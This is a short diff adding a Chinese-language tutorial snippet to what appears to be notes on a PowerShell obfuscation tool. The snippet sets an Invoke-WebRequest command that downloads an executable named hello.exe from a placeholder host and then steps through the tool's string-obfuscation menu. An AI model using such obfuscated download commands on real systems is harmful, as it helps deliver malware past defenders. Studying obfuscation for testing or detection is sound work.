@@ -28,5 +28,17 @@ show options
 out
 ```
 
+一个简单混淆示例：  
+```r
+SET SCRIPTBLOCK Invoke-WebRequest -uri 'https://www.helloworld.com/index.php' -OutFile 'hello.exe'
+string
+2
+2
+2
+2
+back
+out
+```
+
 
 2020/5/28  
